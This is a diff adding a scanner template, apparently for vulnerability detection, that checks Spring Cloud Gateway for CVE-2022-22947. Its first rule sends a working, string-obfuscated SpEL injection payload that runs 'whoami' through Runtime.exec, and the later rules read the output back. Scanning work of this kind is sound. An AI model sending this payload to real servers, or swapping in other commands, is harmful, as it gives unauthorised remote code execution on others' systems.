@@ -1,0 +1,42 @@
+name: Spring_Cloud_Gateway_Actuator_API_SpEL_Code_Injection__CVE_2022_22947
+transport: http
+detail:
+  dock: '((header="Server: Netty@SpringBoot" || (body="Whitelabel Error Page" && body="There
+    was an unexpected error")) && body!="couchdb") || title="SpringBootAdmin-Server"
+    || body="SpringBoot"'
+  product: Spring Cloud Gateway
+  homepage: https://spring.io/
+  impact: <p>Applications using Spring Cloud Gateway in the version prior to 3.1.0
+    and 3.0.6, are vulnerable to a code injection attack when the Gateway Actuator
+    endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously
+    crafted request that could allow arbitrary remote execution on the remote host.</p>
+  description: <p>Spring Cloud Gateway is the second-generation gateway framework
+    officially launched by Spring Cloud, replacing the Zuul gateway. As the traffic,
+    the gateway plays a very important role in the microservice system. The common
+    functions of the gateway include routing and forwarding, permission verification,
+    and current limiting control.</p><p>Applications using Spring Cloud Gateway in
+    the version prior to 3.1.0 and 3.0.6, are vulnerable to a code injection attack
+    when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote
+    attacker could make a maliciously crafted request that could allow arbitrary remote
+    execution on the remote host.</p>
+set:
+  randStr: randomLowercase(8)
+rules: 
+  r1:
+    method: POST
+    url: /actuator/gateway/routes/{{randStr}}
+    headers:
+      Content-Type: application/json
+    body: "{\r\n\"id\": \"{{randStr}}\",\r\n\"filters\": [{\r\n \"name\": \"AddResponseHeader\",\r\n \"args\": {\r\n   \"name\": \"Result\",\r\n   \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),(T(java.lang.System).getProperty(\\\"os.name\\\").toLowerCase().contains(\\\"win\\\")?new String[]{\\\"cmd\\\", \\\"/c\\\", \\\"whoami\\\"}:new String[]{\\\"/bin/bash\\\", \\\"-c\\\", \\\"whoami\\\"})).getInputStream()))}\"\r\n }\r\n}],\r\n\"uri\": \"http://example.com\"\r\n}"
+    expression: response.status == 201
+  r2:
+    method: POST
+    url: /actuator/gateway/refresh
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    expression: true
+  r3:
+    method: GET
+    url: /actuator/gateway/routes/{{randStr}}
+    expression: response.status == 200 && response.body.bcontains(b"AddResponseHeader")
+expression: r1() && r2() && r3()
